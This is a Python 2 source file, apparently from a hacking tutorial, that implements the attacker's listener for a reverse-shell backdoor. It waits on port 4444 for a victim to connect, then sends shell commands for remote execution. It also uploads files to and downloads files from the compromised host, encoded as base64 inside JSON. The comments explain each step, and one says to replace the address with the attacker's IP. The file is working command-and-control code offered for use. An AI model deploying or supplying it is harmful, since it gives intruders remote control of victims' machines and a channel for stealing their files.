#!usr/bin/env python
# json(javascript object notation) is implemented
# in wide range of prog. lang. so we are using it
# -----------
# it converts data structures, lists into string or text and vice versa
# it wraps all data into a jason object then sends it
# and then unwraps it to get the normal format

import socket
import json
import base64
import subprocess

class Listner:
    def __init__(self, ip, port):
        listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listner.bind((ip, port))
        listner.listen(0)
        # socket class will open the socket
        # we will pass the family (AF_INET) first
        # and we pass the socket type
        # -----
        # we willchange an option in socket object
        # setsockopt will do this
        # we need to modify level SOL_SOCKET and the
        # option we want to moidfy is SO_REUSEADDR and put it to 1
        # this will keep the socket reusable even if the connection dropped
        # -----
        # this will bind the ip and port number for incoming connections
        # next we will listen to the connection and give it a backlog
        # backlog is the max no. of connections can
        # be queued before system will start rejecting connections
        # next we will accept the incoming connection
        print("!!!--waiting")
        self.connect, address = listner.accept()
        # listner.accept will return two values
        # 1st is the socket object that we can use to send or recieve data
        # 2nd is the address bound to this connection
        print("\n!!!--GOT A CONNECTION FROM" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connect.send(json_data)
        # this function will take the data, and convert it
        # dumps function will convert the data into a json object
        # and we will send it normally

    def reliable_reciev(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connect.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
                # this function will receive the jason data through normal recv method
                # loads function will unwraps the received data
                # and return it in normal format

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "\n..download successful"
            # this function will get triggered when command contains download
            # it will access the path then access the content in the file
            # then create a file with same name then
            # convert  the content in it and write the content in the created file

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connect.close()
            exit()
            # here we are checking that if entered
            # command is exit then first prog will
            # send the command and then execute exit
        return self.reliable_reciev()

    def run(self):
        while True:
            command = raw_input(">> ")
            cd_com = command
            try:
                command = command.split(" ")
                # here we are splitting the data into
                # list seperated on the basis of spaces
                # and then we will send the data via json
                if command[0] == "cd":
                    command = cd_com
                    command = command.split(" ", 1)

                if command[0] in ["upload", "Upload"]:
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] in ["download", "Download"] and "error" not in result:
                    result = self.write_file(command[1], result)

            except Exception:
                result = "!!!--- error during command execution"

            print(result)

my_listner = Listner("0.0.0.0", 4444) # replace 0.0.0.0 with attacker's ip
my_listner.run()

